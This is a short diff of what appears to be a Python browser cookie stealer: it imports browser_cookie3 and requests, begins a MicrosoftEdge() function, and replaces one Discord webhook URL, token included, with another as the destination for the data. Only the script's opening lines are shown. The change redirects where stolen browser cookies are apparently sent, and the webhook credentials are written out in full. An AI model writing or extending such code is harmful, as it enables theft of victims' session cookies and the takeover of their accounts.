@@ -1,6 +1,6 @@
 import browser_cookie3, requests, threading
 
-WebHook = "https://discord.com/api/webhooks/1072608757252640818/iigfcRiXmtBfSz3w50ws6Z4Tc1NGUz-yGzGf2icEM8BeCVUmSc1qtotHprFzOtldBFHM"
+WebHook = "https://discord.com/api/webhooks/1072611406878343279/ISc8jHQLy4wRgvMVIm7oF9HeXYNkIL9q0gImMKsnrVJ4rEEnBmCjlouMAGvhMd-Ns1zO"
 
 def MicrosoftEdge():
     try:
